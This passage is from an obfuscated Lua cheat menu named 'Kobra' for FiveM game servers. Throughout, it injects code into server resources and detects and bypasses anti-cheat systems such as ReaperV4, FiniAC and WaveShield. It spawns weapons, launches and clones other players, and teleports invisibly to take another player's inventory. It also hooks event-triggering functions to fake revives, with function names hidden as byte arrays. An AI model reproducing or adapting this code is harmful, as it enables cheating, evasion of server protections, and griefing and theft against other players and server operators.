                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v256,v255));break;end end elseif (GetResourceState("ReaperV4")=="started") then local v906=0 -0 ;while true do if (v906==1) then v251:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",2856 + 144 );GiveWeaponToPed(v256,v257,18473 -8474 ,false,true);v906=2;end if (v906==2) then SetCurrentPedWeapon(v256,v257,true);Wait(1484 -(885 + 349) );v906=3 + 0 ;end if (v906==(0 -0)) then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v906=2 -1 ;end if (v906==(971 -(915 + 53))) then MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v257   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );break;end end elseif (GetResourceState("FiniAC")=="started") then local v1009=801 -(768 + 33) ;while true do if (v1009==(3 -2)) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v255));break;end if ((0 -0)==v1009) then v251:Notify("info","Kobra","Spawned Weapon Bypass #1",3328 -(287 + 41) );MachoResourceStop("ox_inventory");v1009=848 -(638 + 209) ;end end else v251:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v255));end break;end end end;v12.GiveAllWeapons=function(v259) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v260) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v261,v262,v263) local v264=0;local v265;local v266;while true do if (v264==(2 + 1)) then CreateThread(function() local v676=1686 -(96 + 1590) ;local v677;local v678;local v679;local v680;local v681;local v682;local v683;local v684;local v685;while true do if (v676==(1676 -(741 + 931))) then for v969=1 + 0 ,42 -27  do if  not DoesEntityExist(v678) then break;end local v970=GetEntityCoords(v678);if  not v970 then break;end SetEntityCoords(v679,v970.x,v970.y,v970.z + 0.5 ,false,false,false,false);Wait(233 -183 );AttachEntityToEntityPhysically(v679,v678,0 + 0 ,0 + 0 ,0 + 0 ,0,569 -419 ,0 + 0 ,0 + 0 ,0,0 -0 ,0 + 0 ,1,false,false,495 -(64 + 430) ,2 + 0 );Wait(413 -(106 + 257) );DetachEntity(v679,true,true);Wait(71 + 29 );end Wait(1221 -(496 + 225) );ClearPedTasksImmediately(v679);if v684 then local v1010=0 -0 ;while true do if (v1010==(0 -0)) then SetEntityCoords(v679,v684.x,v684.y,v684.z + (1659 -(256 + 1402)) ,false,false,false,false);Wait(100);v1010=1;end if (v1010==(1900 -(30 + 1869))) then SetEntityCoords(v679,v684.x,v684.y,v684.z,false,false,false,false);break;end end end v676=1374 -(213 + 1156) ;end if (v676==(189 -(96 + 92))) then v679=PlayerPedId();if  not v679 then return;end v680=GetEntityCoords(v679);v681=GetEntityCoords(v678);v676=2;end if (v676==3) then if (v682>10) then v684=v680;local v1011=math.random() * (1 + 1) * math.pi ;local v1012=math.random(904 -(142 + 757) ,8 + 1 );local v1013=math.cos(v1011) * v1012 ;local v1014=math.sin(v1011) * v1012 ;local v1015=vector3(v681.x + v1013 ,v681.y + v1014 ,v681.z);SetEntityCoordsNoOffset(v679,v1015.x,v1015.y,v1015.z,false,false,false);SetEntityVisible(v679,false,0);v683=true;Wait(100);end v685=v266(v681,v263);if ( #v685==(0 + 0)) then end ClearPedTasksImmediately(v679);v676=83 -(32 + 47) ;end if (v676==(1982 -(1053 + 924))) then if v683 then SetEntityVisible(v679,true,0 + 0 );end break;end if (v676==2) then if ( not v680 or  not v681) then return;end v682= #(v680-v681);v683=false;v684=nil;v676=3;end if (v676==(0 -0)) then v677=GetPlayerFromServerId(v265);if ( not v677 or (v677== -(1649 -(685 + 963)))) then return;end v678=GetPlayerPed(v677);if ( not v678 or  not DoesEntityExist(v678)) then return;end v676=1 -0 ;end end end);break;end if (v264==(1 -0)) then if  not v265 then return;end v263=v263 or 3000 ;v264=1711 -(541 + 1168) ;end if (v264==2) then v266=nil;function v266(v686,v687) local v688=1597 -(645 + 952) ;local v689;local v690;while true do if (v688==(838 -(669 + 169))) then v689={};v690=PlayerPedId();v688=1;end if (v688==(6 -4)) then return v689;end if (v688==1) then if  not v690 then return v689;end for v971=0,553 -298  do local v972=GetPlayerFromServerId(v971);if (v972 and (v972~= -(1 + 0)) and DoesEntityExist(GetPlayerPed(v972))) then local v1141=0 + 0 ;local v1142;local v1143;while true do if (v1141==(765 -(181 + 584))) then v1142=GetPlayerPed(v972);v1143=GetEntityCoords(v1142);v1141=1;end if (v1141==(1396 -(665 + 730))) then if v1143 then local v1402=0 -0 ;local v1403;while true do if (v1402==0) then v1403= #(v686-v1143);if (v1403<=v687) then table.insert(v689,{player=v972,serverId=v971});end break;end end end break;end end end end v688=2;end end end v264=3;end if (v264==(0 -0)) then if ( not v262 or ( #v262==(1350 -(540 + 810)))) then return;end v265=tonumber(v262[3 -2 ]);v264=2 -1 ;end end end;v12.HandleClonePlayer=function(v267,v268) if ( not v268 or ( #v268==(0 + 0))) then return;end local v269=table.concat(v268,",");MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v269));end;v12.HandleTakeInventory=function(v270,v271) local v272=0;local v273;local v274;while true do if (v272==(205 -(166 + 37))) then v274=GetResourceState("WaveShield")=="started" ;if v274 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v273));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v273));end break;end if (v272==(1882 -(22 + 1859))) then if  not v273 then return;end print("Take Inventory action executed for players: "   .. table.concat(v271,", ") );v272=1774 -(843 + 929) ;end if (v272==(262 -(30 + 232))) then if ( not v271 or ( #v271==(0 -0))) then return;end v273=tonumber(v271[778 -(55 + 722) ]);v272=1 -0 ;end end end;v12.BuildMenuFromWeaponList=function(v275,v276) local v277={};for v335,v336 in ipairs(v276) do if v46[v336] then v277[ #v277 + 1 ]=v46[v336].label;end end return v277;end;v12.GetWeaponModelFromLabel=function(v278,v279) for v337,v338 in pairs(v46) do if (v338.label==v279) then return v337;end end return "";end;v12.RepairVehicle=function(v280) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v93=GetResourceState("ReaperV4")=="started" ;local v94=GetResourceState("WaveShield")=="started" ;local v95=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v281) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v339=0;local v340;while true do if (v339==(0 + 0)) then v340={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(549 -(305 + 244) ,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v95 then if v93 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() local v750=105 -(95 + 10) ;local v751;local v752;while true do if (v750==(1 + 0)) then v752=GetResourceState("ReaperV4")=="started" ;if v751 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v752 then MachoInjectThread(0 -0 ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end break;end if (v750==0) then print("2");v751=GetResourceState("WaveShield")=="started" ;v750=1;end end end,["mc9-medicsystem"]=function() local v753=0 -0 ;local v754;local v755;while true do if (v753==1) then v755=GetResourceState("ReaperV4")=="started" ;if v754 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
